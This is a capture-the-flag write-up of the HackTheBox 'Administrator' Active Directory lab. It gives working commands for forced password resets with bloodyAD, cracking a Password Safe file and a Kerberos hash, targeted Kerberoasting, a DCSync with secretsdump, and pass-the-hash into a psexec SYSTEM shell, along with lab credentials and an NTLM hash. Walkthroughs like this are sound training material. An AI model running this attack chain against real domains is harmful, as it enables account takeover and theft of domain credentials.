---
title: "Administrator HackTheBox" 
date: 2026-1-2 23:00:00 0000+
tags: [WriteUp, Administrator, HTB, Enumeration, Active Directory, FTP, targeted kerberoasting, Kerberoasting, faketime, mimikatz, Rubeus, DCSync, GenericAll, GenericWrite, Hash Cracking, Lateral Movement, Bloodhound, SMB, bloodyAD, Privilege Escalation, Psexec,ForceChangePassword,PTH, powerview, powerup, Windows]
categories: [WriteUps, HackTheBox]
image:          
  path: /assets/images/Administrator_HTB/preview_administrator.png
---
# Administrator HackTheBox

`Adminsitrator` is a medium level box from `HackTheBox` which portrays Active Directory `assumed breach` scenario means we have initial credentials across the domain, then by doing some `lateral movement` we have access to a user which can list files on a `FTP` server containing a `passwordsafe` file, Gaining access to `pwsafe` reveals more users credentials on the domain again doing some `lateral movement` in the domain to get a more privileged user reveals that it can do `DCSync` attack on the `Domain Controller` finally pwning the box.

![image.png](/assets/images/Administrator_HTB/image.png)

## Initial Enumeration

### Rustmap

We start off with the `rustmap` to find the open ports and services running on the box.

```bash
rustmap.py -ip 10.129.4.119
```

![image.png](/assets/images/Administrator_HTB/image%201.png)

Looking at the results we can say that it is an `Active Directory` box.

Ports like `DNS`, `SMB` , `ADWS` and `FTP` are open on the box.

This box is an assumed breach scenario based so we a pair of credentials given to us.

![image.png](/assets/images/Administrator_HTB/image%202.png)

Also the domain name of the box is `administrator.htb` and the hostname of the box is `DC`, so the DC name would be `DC`.

### SMB Enumeration

Using NetExec to enumerate SMB.

We already have credentials so lets try to enumerate shares with it.

```bash
nxc smb administrator.htb -u olivia -p ichliebedich --shares
```

![image.png](/assets/images/Administrator_HTB/image%203.png)

Nothing interesting found.

### FTP Enumeration

We also have `FTP` open on this box with the set of credentials we have lets enumerate `FTP` and see if we have authentication.

```bash
nxc ftp administrator.htb -u olivia -p ichliebedich
```

![image.png](/assets/images/Administrator_HTB/image%204.png)

## Exploitation

### Rusthound

Nothing interesting was found so lets just striaght up jump onto the bloodhound enumeration.

Using `rusthound-ce` to collect all the data.

```bash
rusthound -d administrator.htb -i 10.129.4.119 -u 'olivia' -p 'ichliebedich' -f dc.administrator.htb -z
```

![image.png](/assets/images/Administrator_HTB/image%205.png)

Marking `Olivia` as owned and analyzing the path in `Bloodhound`.

![image.png](/assets/images/Administrator_HTB/image%206.png)

### Olivia → Michael

`Olivia` has `GenericAll` on `Michael` means we can own `Michael` by setting his new password.

Using `bloodyAD` to make the changes.

```bash
bloodyAD -u 'olivia' -p 'ichliebedich' -d administrator.htb -i 10.129.4.119 set password 'Michael' 'aashwin10!'
```

![image.png](/assets/images/Administrator_HTB/image%207.png)

Marking `Michael` as owned.

### Michael → Benjamin

Now `Micheal` can `ForceChangePassword` for `Benjamin` user.

```bash
bloodyAD -u 'Michael' -p 'aashwin10!' -d administrator.htb -i 10.129.4.119 set password 'Benjamin' 'aashwin10!'
```

![image.png](/assets/images/Administrator_HTB/image%208.png)

### Benjamin → FTP Access

Lets now check on `FTP` as `Benjamin` and `Michael`, to see if we have access.

```bash
nxc ftp administrator.htb -u benjamin -p 'aashwin10!'
```

![image.png](/assets/images/Administrator_HTB/image%209.png)

We have validation as `Benjamin`, lets check on `FTP`.

```bash
ftp dc.administrator.htb
```

![image.png](/assets/images/Administrator_HTB/image%2010.png)

We have a `psafe3` file present on the share.

We can open these files with `pwsafe`.

### FTP Access → Pwsafe3

```bash
pwsafe -f Backup.psafe3
```

![image.png](/assets/images/Administrator_HTB/image%2011.png)

We need a pass to open this safe.

Cracking it open using `Hashcat`.

```bash
hashcat -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt
```

![image.png](/assets/images/Administrator_HTB/image%2012.png)

We now have a pass.

Opening the `Password Safe` we have 3 users.

![image.png](/assets/images/Administrator_HTB/image%2013.png)

Saving these users and their passwords to a file.

### Pwsafe → Emily

![image.png](/assets/images/Administrator_HTB/image%2014.png)

Verifying these passwords accross the domain.

```bash
nxc ldap administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

![image.png](/assets/images/Administrator_HTB/image%2015.png)

We have valid creds for user `Emily`, marking them as owned in `bloodhound`.

### Emily → Ethan

Looking at the bloodhound.

![image.png](/assets/images/Administrator_HTB/image%2016.png)

We have `GenericWrite` on `Ethan` so lets exploit this by `targeted kerberoasting` the user `Ethan`.

```bash
faketime -f '+7h' python3 /opt/targetedKerberoast/targetedKerberoast.py -d 'administrator.htb' -u Emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --dc-ip 10.129.194.152 --request-user 'Ethan'
```

![image.png](/assets/images/Administrator_HTB/image%2017.png)

Craking this hash using `hashcat` 

```bash
hashcat -m 13100 ethanhash.txt /usr/share/wordlists/rockyou.txt
```

![image.png](/assets/images/Administrator_HTB/image%2018.png)

Saving these credentials to a file.

### Ethan → Administrator.htb (DCSync)

![image.png](/assets/images/Administrator_HTB/image%2019.png)

After owning `Ethan` we can do `GetChanges`, `GetChangesAll` and `GetChangesInFilteredSet` 

Lets perform a `DCSync` attack on the `Domain Controller`.

Obtaining a `TGT` for the user `ETHAN`.

```bash
faketime -f '+7h' getTGT.py administrator.htb/ethan:'limpbizkit'
```

![image.png](/assets/images/Administrator_HTB/image%2020.png)

Using `Secretsdump` to dump all the domain credentials.

```bash
faketime -f '+7h' secretsdump.py -k -no-pass dc.administrator.htb
```

![image.png](/assets/images/Administrator_HTB/image%2021.png)

Getting a shell on the box using `psexec` with the `administrator`.

### Shell as NT AUTHORITY\SYSTEM

Forging a `ticket` for the `Administrator`.

```bash
faketime -f '+7h' getTGT.py administrator.htb/Administrator -hashes :3dc553ce4b9fd20bd016e098d2d2fd2e
```

![image.png](/assets/images/Administrator_HTB/image%2022.png)

```bash
faketime -f '+7h' psexec.py -k -no-pass DC.ADMINISTRATOR.HTB
```

![image.png](/assets/images/Administrator_HTB/image%2023.png)

Claiming `root.txt` and `user.txt` from the respective user’s directories.

![image.png](/assets/images/Administrator_HTB/image%2024.png)

![image.png](/assets/images/Administrator_HTB/image%2025.png)

Rooted !

![image.png](/assets/images/Administrator_HTB/image%2026.png)

Thanks for reading 🙂